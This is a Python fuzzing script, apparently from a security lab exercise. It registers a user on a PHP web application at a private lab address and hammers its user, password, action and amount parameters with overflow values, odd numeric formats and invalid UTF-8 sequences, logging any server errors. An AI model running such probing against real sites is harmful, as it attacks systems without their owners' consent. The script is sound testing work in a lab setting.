###############################
# Author: Guadagnini Giovanni #
###############################

#!/usr/bin/python3

import os
import requests
from time import sleep

curl_header = {
    "Host" : "10.1.5.2",
    "User-Agent" : "curl.7.72.0",
    "Connection": "Keep-Alive",
    "Cache-Control": "no-cache",
    "Accept": "*/*"
}

payloads = ["", "!)()&//(&/(/(/)))", "1.2", "1,2" "-2147483647", "0.44e10", "-0.44e10", "0.44b2", "-0.44b2", "1&asd()", "abcdefghil", "11aa", "123a321", "now()", "~2147483647", "SIGN(-1)*2147483647", "9223372036854775807", "9223372036854775808", "-9223372036854775807", "-9223372036854775808","aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "!£$%$&/()/$", "&&&&&&&&&&&&&&&&", "%EF%BF%BE", "%EF%BF%BF", "%ED%A0%80", "%EF%B7%AF", "%F0%BF%BF%BF", "%ED%AD%BF%ED%B0%80"]

errors = []

user = "JJJJJJJJ"
password = "YYYYYYYYYY"

def registerUser():
    request_url = "http://10.1.5.2/process.php?user={}&pass={}&drop={}".format(user, password, "register")
    r = requests.get(request_url, headers=curl_header)

    print("User should be registered ({}):\n{}".format(r.status_code, r.text))
    print("---------------------------------------")

def sendRequest(fieldToAttack, payload, action):
    if(fieldToAttack == "user"):
        request_url = "http://10.1.5.2/process.php?user={}&pass={}&drop={}&amount={}".format(payload, password, action, "2147483647")
    elif(fieldToAttack == "password"):
        request_url = "http://10.1.5.2/process.php?user={}&pass={}&drop={}&amount={}".format(user, payload, action, "2147483647")
    elif(fieldToAttack == "drop"):
        request_url = "http://10.1.5.2/process.php?user={}&pass={}&drop={}&amount={}".format(user, password, payload, "2147483647")
    elif(fieldToAttack == "amount"):
        request_url = "http://10.1.5.2/process.php?user={}&pass={}&drop={}&amount={}".format(user, password, action, payload)
    
    r = requests.get(request_url, headers=curl_header)
    print("URL: {}".format(request_url))
    
    if(r.status_code != 200):
        print("The request ({}) generated an error in the webserver.\n".format(payload))
        errors.append("url: {}, payload: {}, status {}".format(request_url, payload, r.status_code))

    print("Response ({}):\n{}".format(r.status_code, r.text))
    print("---------------------------------------")

def waitForUserInput():
    sleep(1) 
    input('Press a key to continue...')

def main():
    registerUser()
    waitForUserInput()
    for payload in payloads:
        sendRequest("amount", payload, "deposit")
        waitForUserInput()
        sendRequest("amount", payload, "withdraw")
        waitForUserInput()
        sendRequest("amount", payload, "balance")
        waitForUserInput()
        sendRequest("amount", payload, "register")
        waitForUserInput()
    
    for payload in payloads:
        sendRequest("drop", payload, "deposit")
        waitForUserInput()
        sendRequest("drop", payload, "withdraw")
        waitForUserInput()
        sendRequest("drop", payload, "balance")
        waitForUserInput()
        sendRequest("drop", payload, "register")
        waitForUserInput()

    for payload in payloads:
        sendRequest("user", payload, "deposit")
        waitForUserInput()
        sendRequest("user", payload, "withdraw")
        waitForUserInput()
        sendRequest("user", payload, "balance")
        waitForUserInput()
        sendRequest("user", payload, "register")
        waitForUserInput()

    for payload in payloads:
        sendRequest("user", payload, "register")
        waitForUserInput()
        sendRequest("password", payload, "register")
        waitForUserInput()

    if(len(errors) > 0):
        print("------------------ERRORS--------------------")
        for e in errors:
            print(e)
    else:
        print("No page status error detected using the payloads.")

if __name__ == "__main__":
    main()
